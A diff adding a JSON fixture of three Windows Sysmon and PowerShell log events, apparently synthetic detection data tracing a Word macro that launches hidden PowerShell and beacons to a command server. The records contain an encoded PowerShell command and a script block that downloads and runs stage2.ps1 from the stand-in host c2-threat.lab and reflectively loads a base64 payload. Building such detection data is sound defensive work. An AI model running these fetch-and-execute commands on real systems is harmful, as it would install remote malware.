@@ -1,0 +1,45 @@
+[
+  {
+    "_time": "2026-04-18T15:10:12.000Z",
+    "EventCode": 1,
+    "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
+    "Computer": "FIN-WS-09.CORP.LOCAL",
+    "User": "CORP\\cjohnson",
+    "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+    "ParentCommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\cjohnson\\Downloads\\Q2_Financial_Invoice_Update.docm\"",
+    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "CommandLine": "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwAyAC0AdABoAHIAZQBhAHQALgBsAGEAYgAvAHMAdABhAGcAZQAyAC4AcABzADEAJwApAA==",
+    "ProcessId": 8944,
+    "ParentProcessId": 4120,
+    "Hashes": "SHA256=9A588B4B87CE12984180AE7B21447D08518FE27CEEFEAEBD029F64B3BBEF479C",
+    "attack_tag": "T1204.002-MacroSpawn"
+  },
+  {
+    "_time": "2026-04-18T15:10:14.000Z",
+    "EventCode": 4104,
+    "sourcetype": "WinEventLog:Microsoft-Windows-PowerShell/Operational",
+    "Computer": "FIN-WS-09.CORP.LOCAL",
+    "User_ID": "S-1-5-21-392019482-38491823-1002",
+    "ScriptBlockId": "19b48f91-2bc3-4889-a212-004aef729910",
+    "ScriptBlockText": "IEX (New-Object Net.WebClient).DownloadString('http://c2-threat.lab/stage2.ps1'); $payload = [System.Convert]::FromBase64String('TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAABQRQAATAEDAF...'); [System.Reflection.Assembly]::Load($payload);",
+    "SuspicionScore": 90,
+    "c2_domain": "http://c2-threat.lab/stage2.ps1",
+    "attack_tag": "T1059.001-PowerShellDeobfuscation"
+  },
+  {
+    "_time": "2026-04-18T15:10:16.000Z",
+    "EventCode": 3,
+    "sourcetype": "XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",
+    "Computer": "FIN-WS-09.CORP.LOCAL",
+    "User": "CORP\\cjohnson",
+    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "SourceIp": "192.168.10.42",
+    "SourcePort": 51920,
+    "DestinationIp": "185.220.101.5",
+    "DestinationHostname": "c2-threat.lab",
+    "DestinationPort": 443,
+    "Protocol": "tcp",
+    "Initiated": true,
+    "attack_tag": "T1071.001-C2Beacon"
+  }
+]
